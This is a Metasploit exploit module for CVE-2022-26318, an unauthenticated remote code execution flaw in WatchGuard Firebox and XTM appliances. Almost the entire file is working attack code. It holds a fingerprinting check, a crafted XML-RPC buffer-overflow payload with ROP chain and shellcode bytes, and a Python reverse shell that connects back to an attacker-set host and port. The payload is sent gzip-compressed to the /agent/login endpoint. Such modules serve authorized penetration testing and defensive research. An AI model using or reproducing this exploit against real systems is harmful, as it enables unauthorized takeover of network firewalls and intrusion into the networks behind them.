##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'zlib'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WatchGuard XTM Firebox Unauthenticated Remote Command Execution',
        'Description' => %q{
          This module exploits a buffer overflow at the administration interface (8080 or 4117) of WatchGuard Firebox
          and XTM appliances which is built from a cherrypy python backend sending XML-RPC requests to a C binary
          called wgagent using pre-authentication endpoint /agent/login.
          This vulnerability impacts Fireware OS before 12.7.2_U2, 12.x before 12.1.3_U8, and 12.2.x through 12.5.x
          before 12.5.9_U2. Successful exploitation results in remote code execution as user nobody.
        },
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module
          'Charles Fol (Ambionics Security)', # discovery
          'Dylan Pindur (AssetNote)', # reverse engineering of CVE-2022-26318'
          'Misterxid' # POC
        ],
        'References' => [
          [ 'CVE', '2022-26318' ],
          [ 'URL', 'https://www.ambionics.io/blog/hacking-watchguard-firewalls' ],
          [ 'URL', 'https://www.assetnote.io/resources/research/diving-deeper-into-watchguard-pre-auth-rce-cve-2022-26318' ],
          [ 'URL', 'https://github.com/misterxid/watchguard_cve-2022-26318' ],
          [ 'URL', 'https://attackerkb.com/topics/t8Nrnu99ZE/cve-2022-26318' ]
        ],
        'License' => MSF_LICENSE,
        'Platform' => [ 'unix' ],
        'Privileged' => false,
        'Arch' => [ ARCH_CMD ],
        'Targets' => [
          [
            'Automatic (Reverse Python Interactive Shell)',
            {
              'Platform' => [ 'unix' ],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_python',
                'SHELL' => '/usr/bin/python'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2022-08-29',
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 8080
        },
        'Notes' => {
          'Stability' => [ SERVICE_RESOURCE_LOSS ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [ true, 'WatchGuard Firebox base url', '/' ])
      ]
    )
  end

  def check_watchguard_firebox?
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'auth', 'login'),
      'vars_get' => {
        'from_page' => '/'
      }
    })
    return true if res && res.code == 200 && res.body.include?('Powered by WatchGuard Technologies') && res.body.include?('Firebox')

    false
  end

  def create_bof_payload
    # temporary filename in /tmp where python payload will be stored.
    @py_fname = "/tmp/#{Rex::Text.rand_text_alphanumeric(4)}.py"
    # xml overflow payload
    payload = '<methodCall><methodName>agent.login</methodName><params><param><value><struct><member><value><'.encode
    payload << ('A' * 3181).encode
    payload << 'MFA>'.encode
    payload << ('<BBBBMFA>' * 3680).encode
    # padding and rop chain
    payload << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    payload << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    payload << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    payload << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    payload << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    payload << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    payload << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    payload << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    payload << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 P@\x00\x00"
    payload << "\x00\x00\x00h\xf9@\x00\x00\x00\x00\x00 P@\x00\x00\x00\x00\x00\x00\x00\x0e\xd6A\x00\x00\x00\x00\x00\xb1\xd5A"
    payload << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}^@\x00\x00\x00\x00\x00"
    payload << "\x00\x00\x00\x00\x00\x00\x00\x00|^@\x00\x00\x00\x00\x00\xad\xd2A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    payload << "\x00\x00\x00\x0e\xd6A\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    payload << "\x00\x00\x00\x00\x00\x00\x00\x00*\xa9@\x00\x00\x00\x00\x00H\x8d=\x9d\x00\x00\x00\xbeA\x02\x00\x00\xba\xb6"
    payload << "\x01\x00\x00\xb8\x02\x00\x00\x00\x0f\x05H\x89\x05\x92\x00\x00\x00H\x8b\x15\x93\x00\x00\x00H\x8d5\x94\x00"
    payload << "\x00\x00H\x8b=}\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05H\x8b=o\x00\x00\x00\xb8\x03\x00\x00\x00\x0f\x05\xb8;"
    payload << "\x00\x00\x00H\x8d=?\x00\x00\x00H\x89= \x00\x00\x00H\x8d5A\x00\x00\x00H\x895\x1a\x00\x00\x00H\x8d5\x0b\x00"
    payload << "\x00\x001\xd2\x0f\x05\xb8<\x00\x00\x00\x0f\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    payload << "\x00\x00\x00\x00\x00\x00\x00\x00\x00#{datastore['SHELL']}\x00#{@py_fname}\x00\x00\x00\x00\x00\x00\x00\x00\x00\xef"
    payload << "\x01\x00\x00\x00\x00\x00\x00"
    # shell code to launch an reverse interactive python shell
    # The Watchguard appliance has a very restricted linux command set, readonly root filesystem and no unix shells installed
    # The interactive Python shell (-i) is for now the only way to get shell access
    payload << 'import socket;from subprocess import call; from os import dup2;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'.encode
    payload << "s.connect((\"#{datastore['LHOST']}\",#{datastore['LPORT']})); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2);".encode
    payload << "call([\"#{datastore['SHELL']}\",\"-i\"]);".encode
    payload << "import os; os.remove(\"#{@py_fname}\");".encode
    return Zlib.gzip(payload)
  end

  def check
    print_status("Checking if #{peer} can be exploited.")
    return CheckCode::Detected if check_watchguard_firebox?

    CheckCode::Safe
  end

  def exploit
    print_status("#{peer} - Attempting to exploit...")
    bof_payload = create_bof_payload
    print_status("#{peer} - Sending payload...")
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'agent', 'login'),
      'headers' => {
        'Accept-Encoding' => 'gzip, deflate',
        'Content-Encoding' => 'gzip'
      },
      'data' => bof_payload
    })
  end
end
